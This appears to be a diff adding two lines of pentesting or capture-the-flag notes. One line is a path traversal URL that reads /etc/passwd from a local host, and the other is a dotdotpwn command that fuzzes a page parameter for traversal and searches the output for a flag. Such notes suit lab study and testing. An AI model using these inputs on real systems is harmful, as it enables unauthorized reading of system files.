@@ -1,0 +1,2 @@
+Path traversal : http://192.168.1.16/?page=../../../../../../../etc/passwd
+Using dotdotpwn : dotdotpwn.pl -m http-url http://host -u “http://host/?page=TRAVERSAL” -q -k “flag”
